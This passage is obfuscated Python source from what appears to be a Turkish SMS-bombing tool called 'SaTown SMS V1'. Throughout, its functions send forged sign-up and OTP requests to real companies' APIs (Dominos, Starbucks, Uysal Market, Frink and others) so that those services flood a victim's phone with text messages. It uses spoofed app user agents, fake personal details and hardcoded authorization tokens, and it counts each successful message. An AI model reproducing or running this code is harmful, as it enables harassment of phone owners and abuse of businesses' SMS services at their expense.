            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOO00OO0O0000O0O0.phone} --> 94.102.66.162:80")#line:587
    def Tasimacim (O0OOO00OO00OOOO0O ):#line:591
        try :#line:592
            O0O0O0O0OOOOO0OO0 ="https://server.tasimacim.com/requestcode"#line:593
            O000OOOO00O0000O0 ={"phone":O0OOO00OO00OOOO0O .phone ,"lang":"tr"}#line:594
            O0OOOOOOOO000OO00 =requests .post (url =O0O0O0O0OOOOO0OO0 ,json =O000OOOO00O0000O0 ,timeout =6 )#line:595
            if O0OOOOOOOO000OO00 .status_code ==200 :#line:596
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0OOO00OO00OOOO0O.phone} --> server.tasimacim.com")#line:597
                O0OOO00OO00OOOO0O .adet +=1 #line:598
            else :#line:599
                raise #line:600
        except :#line:601
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0OOO00OO00OOOO0O.phone} --> server.tasimacim.com")#line:602
    def ToptanTeslim (O0O00OOOOOO0O0OO0 ):#line:606
        try :#line:607
            OOO00O0OO00O00O00 ="https://toptanteslim.com:443/Services/V2/MobilServis.aspx"#line:608
            O00O00000O000O0O0 ={"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json","Mode":"no-cors","U":"e-ticaret","User-Agent":"eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0","Accept-Language":"tr-TR,tr;q=0.9","Accept-Encoding":"gzip, deflate, br"}#line:609
            O0O000O0O0OOOO0OO ={"ADRES":"ZXNlZGtm","DIL":"tr_TR","EPOSTA":O0O00OOOOOO0O0OO0 .mail ,"EPOSTA_BILDIRIM":True ,"ILCE":"BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R","ISLEM":"KayitOl","ISTEMCI":"BEABC9B2-A58F-3131-AF46-2FF404F79677","KIMLIKNO":None ,"KULLANICI_ADI":"Memati","KULLANICI_SOYADI":"Bas","PARA_BIRIMI":"TL","PAROLA":"312C6383DE1465D08F635B6121C1F9B4","POSTAKODU":"377777","SEHIR":"\xc4\xb0STANBUL","SEMT":"BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.","SMS_BILDIRIM":True ,"TELEFON":O0O00OOOOOO0O0OO0 .phone ,"TICARI_UNVAN":"kdkd","ULKE_ID":1105 ,"VERGI_DAIRESI":"sjje","VERGI_NU":""}#line:610
            OOOO0O000000O0O00 =requests .post (OOO00O0OO00O00O00 ,headers =O00O00000O000O0O0 ,json =O0O000O0O0OOOO0OO ,timeout =6 )#line:611
            if OOOO0O000000O0O00 .json ()["Durum"]==True :#line:612
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0O00OOOOOO0O0OO0.phone} --> toptanteslim.com")#line:613
                O0O00OOOOOO0O0OO0 .adet +=1 #line:614
            else :#line:615
                raise #line:616
        except :#line:617
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0O00OOOOOO0O0OO0.phone} --> toptanteslim.com")#line:618
    def Uysal (OO00O0OO000O000O0 ):#line:622
        try :#line:623
            O0OOO0OO0000O0OOO ="https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"#line:624
            O00O00OO00O000000 ={"Accept":"*/*","Content-Type":"application/json","Accept-Encoding":"gzip, deflate, br","User-Agent":"UM Uysal Online Market/1.0.15 (team.clevel.uysalmarket; build:1; iOS 15.8.0) Alamofire/5.4.1","Accept-Language":"tr-TR;q=1.0, en-TR;q=0.9","Connection":"close"}#line:625
            O00OO0000O0O0OO0O ={"phone_number":OO00O0OO000O000O0 .phone }#line:626
            OO0O0O0000O0000OO =requests .post (O0OOO0OO0000O0OOO ,headers =O00O00OO00O000000 ,json =O00OO0000O0O0OO0O ,timeout =6 )#line:627
            if OO0O0O0000O0000OO .status_code ==200 :#line:628
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO00O0OO000O000O0.phone} --> api.uysalmarket.com.tr")#line:629
                OO00O0OO000O000O0 .adet +=1 #line:630
            else :#line:631
                raise #line:632
        except :#line:633
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO00O0OO000O000O0.phone} --> api.uysalmarket.com.tr")#line:634
    def Yapp (O000OO0OOOOOOOOOO ):#line:638
        try :#line:639
            OO0OO0OOOOO0OOO0O ="https://yapp.com.tr:443/api/mobile/v1/register"#line:640
            OO00O00O00OO0OO0O ={"app_version":"1.1.2","code":"tr","device_model":"iPhone9,4","device_name":"","device_type":"I","device_version":"15.7.8","email":O000OO0OOOOOOOOOO .mail ,"firstname":"Memati","is_allow_to_communication":"1","language_id":"1","lastname":"Bas","phone_number":O000OO0OOOOOOOOOO .phone ,"sms_code":""}#line:641
            OOOO00OO0OOO0OOO0 =requests .post (url =OO0OO0OOOOO0OOO0O ,json =OO00O00O00OO0OO0O ,timeout =6 )#line:642
            if OOOO00OO0OOO0OOO0 .status_code ==200 :#line:643
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O000OO0OOOOOOOOOO.phone} --> yapp.com.tr")#line:644
                O000OO0OOOOOOOOOO .adet +=1 #line:645
            else :#line:646
                raise #line:647
        except :#line:648
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O000OO0OOOOOOOOOO.phone} --> yapp.com.tr")#line:649
    def YilmazTicaret (OOOO00O0OOOOOOO0O ):#line:653
        try :#line:654
            O00OO0OO0O0O00OO0 ="http://www.yilmazticaret.net:80/restapi2/register/"#line:655
            O000O0O0000O00O00 ={"Authorization":"Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}#line:656
            O0OOO0O00OO00OO00 ={"telefon":(None ,f"0 {OOOO00O0OOOOOOO0O.phone}"),"token":(None ,"ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}#line:657
            O000O0000O00OO0O0 =requests .post (O00OO0OO0O0O00OO0 ,headers =O000O0O0000O00O00 ,data =O0OOO0O00OO00OO00 ,timeout =6 )#line:658
            if O000O0000O00OO0O0 .json ()["giris"]=="success":#line:659
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOOO00O0OOOOOOO0O.phone} --> yilmazticaret.net")#line:660
                OOOO00O0OOOOOOO0O .adet +=1 #line:661
            else :#line:662
                raise #line:663
        except :#line:664
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOOO00O0OOOOOOO0O.phone} --> yilmazticaret.net")#line:665
    def Yuffi (O00OO00000O00OOO0 ):#line:669
        try :#line:670
            OO00O000OO000OOO0 ="https://api.yuffi.co/api/parent/login/user"#line:671
            OOO00OO0O000OO0OO ={"phone":O00OO00000O00OOO0 .phone ,"kvkk":True }#line:672
            OO0O0OOO000O0OOO0 =requests .post (OO00O000OO000OOO0 ,json =OOO00OO0O000OO0OO ,timeout =6 )#line:673
            if OO0O0OOO000O0OOO0 .json ()["success"]==True :#line:674
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O00OO00000O00OOO0.phone} --> api.yuffi.co")#line:675
                O00OO00000O00OOO0 .adet +=1 #line:676
            else :#line:677
                raise #line:678
        except :#line:679
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O00OO00000O00OOO0.phone} --> api.yuffi.co")#line:680
    def Beefull (O0O0O0OOOO0O00000 ):#line:684
        try :#line:685
            OOOOO0O0000O0O0O0 ="https://app.beefull.io:443/api/inavitas-access-management/signup"#line:686
            OO00OO0O0O000OOO0 ={"email":O0O0O0OOOO0O00000 .mail ,"firstName":"Memati","language":"tr","lastName":"Bas","password":"123456","phoneCode":"90","phoneNumber":O0O0O0OOOO0O00000 .phone ,"tenant":"beefull","username":O0O0O0OOOO0O00000 .mail }#line:687
            requests .post (OOOOO0O0000O0O0O0 ,json =OO00OO0O0O000OOO0 ,timeout =4 )#line:688
            OOOOO0O0000O0O0O0 ="https://app.beefull.io:443/api/inavitas-access-management/sms-login"#line:689
            OO00OO0O0O000OOO0 ={"phoneCode":"90","phoneNumber":O0O0O0OOOO0O00000 .phone ,"tenant":"beefull"}#line:690
            OOO0O00OOOO0000OO =requests .post (OOOOO0O0000O0O0O0 ,json =OO00OO0O0O000OOO0 ,timeout =4 )#line:691
            if OOO0O00OOOO0000OO .status_code ==200 :#line:692
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0O0O0OOOO0O00000.phone} --> app.beefull.io")#line:693
                O0O0O0OOOO0O00000 .adet +=1 #line:694
            else :#line:695
                raise #line:696
        except :#line:697
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0O0O0OOOO0O00000.phone} --> app.beefull.io")#line:698
    def Starbucks (OOO000O0O0O00OOOO ):#line:702
        try :#line:703
            OO0O0000OOOOOOO00 ="https://auth.sbuxtr.com:443/signUp"#line:704
            OOO000OOOOOO0OOOO ={"Content-Type":"application/json","Operationchannel":"ios","Accept":"*/*","Accept-Encoding":"gzip, deflate, br"}#line:705
            OOOOOO0OO0O0O0OO0 ={"allowEmail":True ,"allowSms":True ,"deviceId":"31","email":OOO000O0O0O00OOOO .mail ,"firstName":"Memati","lastName":"Bas","password":"31ABC..abc31","phoneNumber":OOO000O0O0O00OOOO .mail ,"preferredName":"Memati"}#line:706
            O00O00OOOOO0000OO =requests .post (OO0O0000OOOOOOO00 ,headers =OOO000OOOOOO0OOOO ,json =OOOOOO0OO0O0O0OO0 ,timeout =6 )#line:707
            if O00O00OOOOO0000OO .json ()["code"]==50 :#line:708
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOO000O0O0O00OOOO.phone} --> auth.sbuxtr.com")#line:709
                OOO000O0O0O00OOOO .adet +=1 #line:710
            else :#line:711
                raise #line:712
        except :#line:713
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOO000O0O0O00OOOO.phone} --> auth.sbuxtr.com")#line:714
    def Dominos (OO0000OO00OO0000O ):#line:718
        try :#line:719
            OOO0O0O0OOO0O0000 ="https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"#line:720
            OO00O0O0OO000OOO0 ={"Content-Type":"application/json;charset=utf-8","Accept":"application/json, text/plain, */*","Authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg","Device-Info":"Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8","Appversion":"IOS-7.1.0","Accept-Encoding":"gzip, deflate, br","Accept-Language":"tr-TR,tr;q=0.9","User-Agent":"Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0","Servicetype":"CarryOut","Locationcode":"undefined"}#line:721
            O00O00O0OOO000O00 ={"email":OO0000OO00OO0000O .mail ,"isSure":False ,"mobilePhone":OO0000OO00OO0000O .phone }#line:722
            OO0O000OOOOOOO00O =requests .post (OOO0O0O0OOO0O0000 ,headers =OO00O0O0OO000OOO0 ,json =O00O00O0OOO000O00 ,timeout =6 )#line:723
            if OO0O000OOOOOOO00O .json ()["isSuccess"]==True :#line:724
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO0000OO00OO0000O.phone} --> frontend.dominos.com.tr")#line:725
                OO0000OO00OO0000O .adet +=1 #line:726
            else :#line:727
                raise #line:728
        except :#line:729
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO0000OO00OO0000O.phone} --> frontend.dominos.com.tr")#line:730
    def Baydoner (OOO00OOO00O0O0O0O ):#line:734
        try :#line:735
            OOO0000000OO00OOO ="https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"#line:736
            O0OOOOOO0O00O0O0O ={"Content-Type":"application/json","Accept":"*/*","Accept-Language":"tr-TR,tr;q=0.9","Platform":"1","Accept-Encoding":"gzip, deflate, br","User-Agent":"BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"}#line:737
            O0O0O00OOOO0O0000 ={"AppVersion":"1.3.2","AreaCode":90 ,"City":"ADANA","CityId":1 ,"Code":"","Culture":"tr-TR","DeviceId":"31s","DeviceModel":"31","DeviceToken":"3w1","Email":OOO00OOO00O0O0O0O .mail ,"GDPRPolicy":False ,"Gender":"Erkek","GenderId":1 ,"LoyaltyProgram":False ,"merchantID":5701 ,"Method":"","Name":"Memati","notificationCode":"31","NotificationToken":"31","OsSystem":"IOS","Password":"31Memati31","PhoneNumber":OOO00OOO00O0O0O0O .phone ,"Platform":1 ,"sessionID":"31","socialId":"","SocialMethod":"","Surname":"Bas","TempId":942603 ,"TermsAndConditions":False }#line:738
            OO00OOO0OOOO00OO0 =requests .post (OOO0000000OO00OOO ,headers =O0OOOOOO0O00O0O0O ,json =O0O0O00OOOO0O0000 ,timeout =6 )#line:739
            if OO00OOO0OOOO00OO0 .json ()["Control"]==1 :#line:740
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOO00OOO00O0O0O0O.phone} --> crmmobil.baydoner.com")#line:741
                OOO00OOO00O0O0O0O .adet +=1 #line:742
            else :#line:743
                raise #line:744
        except :#line:745
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOO00OOO00O0O0O0O.phone} --> crmmobil.baydoner.com")#line:746
    def Pidem (OOO0O00000O0OOO0O ):#line:750
        try :#line:751
            O0O0OO0O00O00OO0O ="https://restashop.azurewebsites.net:443/graphql/"#line:752
            O00OO000O0O0O00O0 ={"Accept":"*/*","Origin":"https://pidem.azurewebsites.net","Content-Type":"application/json","Authorization":"Bearer null","Referer":"https://pidem.azurewebsites.net/","Accept-Language":"tr-TR,tr;q=0.9","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)","Accept-Encoding":"gzip, deflate, br"}#line:753
            O0OOOOO000O0O0O0O ={"query":"\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n","variables":{"phone":OOO0O00000O0OOO0O .phone }}#line:754
            OOOOO00O00OO0OO0O =requests .post (O0O0OO0O00O00OO0O ,headers =O00OO000O0O0O00O0 ,json =O0OOOOO000O0O0O0O ,timeout =6 )#line:755
            if OOOOO00O00OO0OO0O .json ()["data"]["sendOtpSms"]["resultStatus"]=="SUCCESS":#line:756
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOO0O00000O0OOO0O.phone} --> restashop.azurewebsites.net")#line:757
                OOO0O00000O0OOO0O .adet +=1 #line:758
            else :#line:759
                raise #line:760
        except :#line:761
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOO0O00000O0OOO0O.phone} --> restashop.azurewebsites.net")#line:762
    def Frink (O00O0OOOOO0000OO0 ):#line:766
        try :#line:767
            OOOOOOO000000000O ="https://api.frink.com.tr:443/api/auth/postSendOTP"#line:768
            O00O000O00000OOOO ={"Accept":"*/*","Content-Type":"application/json","Authorization":"","Accept-Encoding":"gzip, deflate, br","User-Agent":"Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1","Accept-Language":"tr-TR;q=1.0, en-TR;q=0.9","Connection":"close"}#line:769
            OO00OO0OOOOOO0O00 ={"areaCode":"90","etkContract":True ,"language":"TR","phoneNumber":"90"+O00O0OOOOO0000OO0 .phone }#line:770
            OOOOOO00O00000OOO =requests .post (OOOOOOO000000000O ,headers =O00O000O00000OOOO ,json =OO00OO0OOOOOO0O00 ,timeout =6 )#line:771
            if OOOOOO00O00000OOO .json ()["processStatus"]=="SUCCESS":#line:772
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O00O0OOOOO0000OO0.phone} --> api.frink.com.tr")#line:773
                O00O0OOOOO0000OO0 .adet +=1 #line:774
            else :#line:775
                raise #line:776
        except :#line:777
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O00O0OOOOO0000OO0.phone} --> api.frink.com.tr")#line:778
    def Bodrum (O000OO00OO000O0OO ):#line:782
        try :#line:783
            OO0O0OO0OO00O0OOO ="https://gandalf.orwi.app:443/api/user/requestOtp"#line:784
            O000000OO0O000OO0 ={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",}#line:785
            OOO0000O000O00OOO ={"gsm":"+90"+O000OO00OO000O0OO .phone ,"source":"orwi"}#line:786
            OO0OO00OO00O0OOOO =requests .post (OO0O0OO0OO00O0OOO ,headers =O000000OO0O000OO0 ,json =OOO0000O000O00OOO ,timeout =6 )#line:787
            if OO0OO00OO00O0OOOO .status_code ==200 :#line:788
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O000OO00OO000O0OO.phone} --> gandalf.orwi.app")#line:789
                O000OO00OO000O0OO .adet +=1 #line:790
            else :#line:791
                raise #line:792
        except :#line:793
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O000OO00OO000O0OO.phone} --> gandalf.orwi.app")#line:794
